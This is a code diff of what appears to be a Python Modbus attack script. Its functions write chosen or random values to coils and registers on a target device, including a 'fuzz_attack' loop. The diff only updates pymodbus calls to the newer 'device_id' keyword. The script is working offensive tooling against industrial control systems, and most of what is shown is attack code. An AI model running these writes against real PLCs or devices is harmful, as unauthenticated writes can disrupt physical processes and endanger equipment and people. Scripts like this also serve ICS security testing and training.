@@ -12,11 +12,8 @@ def write_coil(target_ip, target_port, unit_id, address, value):
         print(f"[*] Connected to {target_ip}:{target_port} (Unit {unit_id})")
         print(f"[*] Writing Coil {address} = {value}")
         try:
-            try:
-                rq = client.write_coil(address, value, slave=unit_id)
-            except TypeError:
-                 rq = client.write_coil(address, value, unit=unit_id)
-            
+            # Pymodbus 3.11+ uses 'device_id'
+            rq = client.write_coil(address, value, device_id=unit_id)
             if rq.isError():
                 print(f"[-] Error writing coil: {rq}")
             else:
@@ -34,11 +31,8 @@ def write_register(target_ip, target_port, unit_id, address, value):
         print(f"[*] Connected to {target_ip}:{target_port} (Unit {unit_id})")
         print(f"[*] Writing Register {address} = {value}")
         try:
-            try:
-                rq = client.write_register(address, value, slave=unit_id)
-            except TypeError:
-                rq = client.write_register(address, value, unit=unit_id)
-                
+            # Pymodbus 3.11+ uses 'device_id'
+            rq = client.write_register(address, value, device_id=unit_id)
             if rq.isError():
                 print(f"[-] Error writing register: {rq}")
             else:
@@ -61,18 +55,12 @@ def fuzz_attack(target_ip, target_port, unit_id, count):
                     addr = random.randint(0, 10)
                     val = random.choice([True, False])
                     print(f"    [{i+1}/{count}] Writing Coil {addr} = {val}")
-                    try:
-                        client.write_coil(addr, val, slave=unit_id)
-                    except TypeError:
-                        client.write_coil(addr, val, unit=unit_id)
+                    client.write_coil(addr, val, device_id=unit_id)
                 else:
                     addr = random.randint(0, 10)
                     val = random.randint(0, 65535)
                     print(f"    [{i+1}/{count}] Writing Register {addr} = {val}")
-                    try:
-                        client.write_register(addr, val, slave=unit_id)
-                    except TypeError:
-                        client.write_register(addr, val, unit=unit_id)
+                    client.write_register(addr, val, device_id=unit_id)
                 time.sleep(0.1)
             except Exception as e:
                 print(f"    [-] Error: {e}")
